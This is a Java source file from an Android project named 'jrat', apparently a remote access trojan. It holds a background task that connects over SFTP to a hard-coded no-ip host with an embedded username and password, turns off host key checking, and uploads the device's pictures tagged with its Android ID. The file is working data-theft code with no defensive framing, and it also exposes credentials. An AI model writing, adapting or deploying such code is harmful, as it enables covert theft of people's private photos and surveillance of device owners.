package com.julioxus.jrat;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Environment;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Properties;

/**
 * Created by julioxus on 13/03/16.
 */
public class SendPicturesAsyncTask extends AsyncTask<Context, Void, String> {

    private Context context;
    private ArrayList<String> pictures;
    private String android_id;

    public SendPicturesAsyncTask(Context context, String android_id, ArrayList<String> pictures) {
        this.context = context;
        this.pictures = pictures;
        this.android_id = android_id;

    }

    @Override
    protected String doInBackground(Context...params) {

        // Connection variables
        JSch jsch = null;
        Session session = null;
        Channel channel = null;
        ChannelSftp c = null;

        String username = "jrat";
        String host = "servidorbicho.no-ip.org";
        String pass = "master2015";

        // Establish connection with the server
        try {
            jsch = new JSch();
            session = jsch.getSession(username, host, 22);
            session.setPassword(pass);

            // Avoid asking for key confirmation
            Properties prop = new Properties();
            prop.put("StrictHostKeyChecking", "no");
            session.setConfig(prop);

            session.connect();

            channel = session.openChannel("sftp");
            channel.connect();
            c = (ChannelSftp) channel;

        } catch (Exception e) {
            e.printStackTrace();
        }

        // Send the pictures to send to the remote server

        // Send pictures to server
        int i = 0;
        do {
            try {

                System.out.println("Starting File Upload:");
                String fsrc = pictures.get(i), fdest = android_id + "-IMG_"+i+".jpg";
                c.put(fsrc, fdest);
            } catch (Exception e) {
                e.printStackTrace();
            }
            i++;
        }while(i < pictures.size());

        // Close connection
        c.disconnect();
        session.disconnect();

        return null;
    }
}
